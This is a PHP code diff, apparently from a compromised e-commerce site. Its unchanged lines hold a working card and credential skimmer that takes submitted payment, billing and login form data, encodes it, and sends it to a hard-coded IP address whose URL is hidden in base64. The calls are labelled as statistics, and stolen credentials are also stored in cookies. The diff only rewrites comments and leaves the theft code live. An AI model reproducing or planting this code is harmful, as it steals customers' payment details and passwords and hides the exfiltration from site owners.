@@ -17,12 +17,12 @@ try {
     if(isset($_POST["payment"])){
         $z=bin2hex(json_encode($_POST["payment"])).$_COOKIE["_flq"];
         sans("statistics_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$z."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA==");
-        // https://45.197.141.250/statystics.php
+        // sans("statistics_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$z."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"https://45.197.141.250/statystics.php");
     }
     if(isset($_POST["payment"]) && isset($_POST["billing"])){
         $z=bin2hex(json_encode($_POST["payment"])).bin2hex(json_encode($_POST["billing"]));
         sans("statistics_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$z."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA==");
-        // https://45.197.141.250/statystics.php
+        // sans("statistics_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$z."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"https://45.197.141.250/statystics.php");
     }
     if((isset($_POST["login"])&&(isset($_POST["login"]["username"]))&&(isset($_POST["login"]["password"])))){
             setcookie("_mtoken",bin2hex($_POST["login"]["username"]." ".$_POST["login"]["password"]),time()+36000,"/");
@@ -33,7 +33,7 @@ try {
             $_COOKIE["_mtoken"]=bin2hex("portzilla"." ".$_COOKIE["portzilla"]);
             $user_data=bin2hex($_SERVER["REQUEST_URI"].";".$_COOKIE["_mtoken"]);
             sans("token_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$user_data."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA==");
-            // https://45.197.141.250/statystics.php
+            // sans("token_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$user_data."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"https://45.197.141.250/statystics.php");
             $_COOKIE["portzilla"]="";setcookie("portzilla","1",time()-36000,"/");
     }
     if(!isset($_COOKIE["_mtoken"])&&(isset($_COOKIE["_fni"]))){
@@ -47,7 +47,7 @@ try {
             $path=substr($path,0,$pos);
             $user_data=bin2hex($path.";".$_COOKIE["_mtoken"]);
             sans("token_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$user_data."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA==");
-            // https://45.197.141.250/statystics.php
+            // sans("token_hash",base64_encode("{'referer':'".$_SERVER["HTTP_HOST"]."','stats':'".$user_data."','tag':'a181a603769c1f98ad927e7367c7aa51'}"),"https://45.197.141.250/statystics.php");
             setcookie("_fni","1",time()+36000,"/");
             setcookie("_mtoken","1",time()-36000,"/");
         }
